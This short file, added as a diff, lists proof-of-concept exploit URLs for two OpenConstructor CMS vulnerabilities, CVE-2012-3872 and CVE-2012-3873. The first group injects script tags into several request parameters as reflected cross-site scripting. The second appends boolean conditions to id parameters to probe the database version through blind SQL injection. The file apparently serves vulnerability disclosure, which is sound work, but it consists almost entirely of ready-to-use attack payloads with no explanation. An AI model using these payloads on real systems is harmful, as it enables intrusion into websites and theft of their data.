@@ -1,0 +1,17 @@
+For CVE-2012-3872:
+http://www.example.com/openconstructor/data/file/edit.php?result=<script>aler('xss')</script>&id=new&ds_id=8&hybridid=&fieldid=&callback=&type=txt&name=test&description=test&fname=test&create=Save
+
+http://www.example.com/openconstructor/confirm.php?q=<script>alert('XSS')</script>skin=metallic
+
+http://www.example.com/openconstructor/users/users.php?type=multiple&keyword=<script>alert('xss')</script>
+
+For CVE-2012-3873:
+http://www.example.com/openconstructor/data/guestbook/edit.php?ds_id=1&id=4AND 1=1
+
+http://www.example.com/openconstructor/data/guestbook/edit.php?ds_id=10&id=4AND (select @@version)='5.5.16-log' 
+
+http://www.example.com/openconstructor/data/guestbook/edit.php?ds_id=10&id=4AND (select @@version)='5.5.16-foo' 
+
+http://www.example.com/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-foo' 
+
+http://www.example.com/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-log'
